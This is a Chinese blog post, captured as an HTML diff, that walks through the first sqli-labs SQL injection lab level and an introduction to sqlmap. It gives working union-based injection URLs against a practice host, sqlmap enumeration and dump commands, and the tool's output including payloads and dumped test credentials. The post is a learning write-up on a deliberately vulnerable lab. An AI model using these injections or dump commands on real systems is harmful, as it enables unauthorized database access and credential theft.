@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>通过sqli-labs学习sql注入 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="sqli-labs,sql注入,sqlmap,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>通过sqli-labs学习sql注入</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-03-24
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>下面开始各个关卡的通关记录，下面使用的是网上有人搭建好的网站，sqli-labs一共有75个关卡，虽然现在有很多种工具可以进行注入，例如<code>sqlmap</code>，但是了解sql注入的原理还是很重要的，了解原理后再使用工具会更加深刻理解工具的作用，前面的关卡会写的比较详细，后面将会简略写，文中一些部分参考《MYSQL注入天书》</p>
+<p>​    浏览器使用的是火狐浏览器，插件<code>Hackbar</code></p>
+<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><ul>
+<li><p><a href="http://43.247.91.228:84/Less-1/" target="_blank" rel="noopener">题目地址</a></p>
+<p>将地址后面加入<code>？id=1&#39;</code>提示<code>You have an error 
+in your SQL syntax; check the manual that corresponds to your MySQL 
+server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line
+1</code></p>
+</li>
+</ul>
+<p>推测数据库查询语句为<code>SELECT * FROM users WHERE id=&#39;$id&#39;</code></p>
+<p>所以使用单引号闭合 并使用<code>--+</code>来注释后面的内容，注释的符号还有很多，这里暂时用这个。</p>
+<p>输入<code>http://43.247.91.228:84/Less-1/?id=1&#39; or 1=1 --+</code>网页显示正常,很明显存在注入。</p>
+<blockquote>
+<p>利用<code>order by</code>子句进行快速猜解表中的列数</p>
+</blockquote>
+<p><code>http://43.247.91.228:84/Less-1/?id=1&#39; order by 3 --+</code> 改变 <code>order by</code>后面的值 直到3时，网页显示正常，</p>
+<p>使用联合查询语句<code>union</code>查询数据库名和数据库版本</p>
+<p><code>http://43.247.91.228:84/Less-1/?id=0 &#39; union select 1,database(),version() --+</code></p>
+<p>网页显示,数据库名字为<code>security</code>版本<code>5.5.44</code></p>
+<p><code>Welcome    Dhakkan 
+Your Login name:security
+Your Password:5.5.44-0ubuntu0.14.04.1</code></p>
+<blockquote>
+<ul>
+<li>基础知识</li>
+</ul>
+<p>mysql里默认有一个数据库名字叫<code>information_schema</code>，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息</p>
+<p>SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p>
+<p><code>TABLES表</code>：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。<code>show tables from schemaname</code> 的结果取之此表</p>
+<p><code>COLUMNS</code>表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，注释等。<code>show columns from schemaname.tablename</code>的结果取之此表。</p>
+</blockquote>
+<p>构造语句查询数据库<code>security</code>中的表</p>
+<p><code>http://43.247.91.228:84/Less-1/?id=0 &#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;  --+</code></p>
+<p>网页显示出<code>Welcome    Dhakkan 
+Your Login name:emails,referers,uagents,users
+Your Password:3</code></p>
+<p>第二行为数据库中的表 ，现在开始查询<code>users</code>中的信息</p>
+<p><code>http://43.247.91.228:84/Less-1/?id=0 &#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;  --+</code></p>
+<p>访问后网页的内容为 <code>Welcome    Dhakkan 
+Your Login name:id,username,password
+Your Password:3</code>    第二行为<code>users</code>表中的列，接下来查出里面的所有数据</p>
+<p><code>http://43.247.91.228:84/Less-1/?id=0 &#39; union select  1,group_concat(id,&#39;-&#39;,username,&#39;-&#39;,password),3  from users --+</code></p>
+<p>访问后<code>Welcome    Dhakkan 
+Your Login 
+name:1-Dumb-Dumb,2-Angelina-I-kill-you,3-Dummy-p@ssword,4-secure-crappy,5-stupid-stupidity,6-superman-genious,7-batman-mob!le,8-admin-admin,9-admin1-admin1,10-admin2-admin2,11-admin3-admin3,12-dhakkan-dumbo,14-admin4-admin4
+Your Password:3</code></p>
+<p>所有数据就这样出来了，这是最基本的注入，没有任何过滤，所以把他放到<code>sqlmap</code>里面很快就能跑出来，下面简单介绍一下<code>sqlmap</code></p>
+<h2 id="sqlmap的简单使用"><a href="#sqlmap的简单使用" class="headerlink" title="sqlmap的简单使用"></a>sqlmap的简单使用</h2><blockquote>
+<ul>
+<li><a href="http://sqlmap.org/" target="_blank" rel="noopener">官方地址</a></li>
+<li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">Github地址</a></li>
+<li><a href="http://www.91ri.org/6775.html" target="_blank" rel="noopener">中文使用说明</a></li>
+</ul>
+<p>Sqlmap是一种开源的渗透测试工具，是用python(python2版本)编写的，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p>
+<p>支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MaxDB </p>
+<p>SQL注入技术：boolean-based blind, time-based blind, error-based, UNION query, stacked queries and out-of-band</p>
+<p>枚举数据：users, password hashes, privileges, roles, databases, tables and columns</p>
+</blockquote>
+<p><code>sqlmap</code>的安装比较简单，这里根据具体题目介绍一些使用方法，环境是windows</p>
+<p>在<code>sqlmap</code>目录下打开<code>cmd</code>窗口输入<code>python2 sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1</code> 之后窗口显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.2.22#dev&#125;</span><br><span class="line">|_ -| . [.]     | .&apos;| . |</span><br><span class="line">|___|_  [)]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 13:54:33 /2019-03-24/</span><br><span class="line"></span><br><span class="line">[13:54:34] [INFO] resuming back-end DBMS &apos;mysql&apos;</span><br><span class="line">[13:54:34] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1&apos; AND 8632=8632 AND &apos;NMxq&apos;=&apos;NMxq</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: id=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162707071,(SELECT (ELT(9426=9426,1))),0x7176767a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &apos;EtLG&apos;=&apos;EtLG</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: id=1&apos; AND SLEEP(5) AND &apos;EiVL&apos;=&apos;EiVL</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id=-8099&apos; UNION ALL SELECT NULL,NULL,CONCAT(0x7162707071,0x437075536d56534d7a576a41696d66774a7448724d4455536e57534b795a4a5277654e686a744a70,0x7176767a71)-- VCgp</span><br><span class="line">---</span><br><span class="line">[13:54:34] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Apache 2.4.7, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.5</span><br><span class="line">[13:54:34] [INFO] fetched data logged to text files under &apos;C:\Users....\sqlmap\output\43.247.91.228&apos;</span><br><span class="line"></span><br><span class="line">[*] ending @ 13:54:34 /2019-03-24/</span><br></pre></td></tr></table></figure>
+<p>在<code>Parameter</code>下有四个结果，分别显示了各个注入类型和<code>payload</code>，说明存在注入点</p>
+<p>之后分别输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security --tables #查询所有表</span><br><span class="line">python2 sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security -T users --columns #查询users表中的列</span><br><span class="line">python2 sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security -T users --dump #爆出users表中的所有数据</span><br></pre></td></tr></table></figure>
+<p>最后结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | Dumb     | Dumb       |</span><br><span class="line">| 2  | Angelina | I-kill-you |</span><br><span class="line">| 3  | Dummy    | p@ssword   |</span><br><span class="line">| 4  | secure   | crappy     |</span><br><span class="line">| 5  | stupid   | stupidity  |</span><br><span class="line">| 6  | superman | genious    |</span><br><span class="line">| 7  | batman   | mob!le     |</span><br><span class="line">| 8  | admin    | admin      |</span><br><span class="line">| 9  | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这次只详细写了一个关卡的通关介绍，以后所有关卡只简单写步骤，记录各种注入的方法，因为本人也刚开始学习，所以写的都是很基础的东西，主要是通过学习，记录各种注入的过程。</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/51ef88ce.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/sqli-labs/">
+              #sqli-labs
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/sql注入/">
+              #sql注入
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/sqlmap/">
+              #sqlmap
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/49b8e53c.html" target="_self">全国大学生信息安全竞赛基础知识学习</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/cde68b77.html" target="_self">sqli-labs 2-5 初识盲注</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
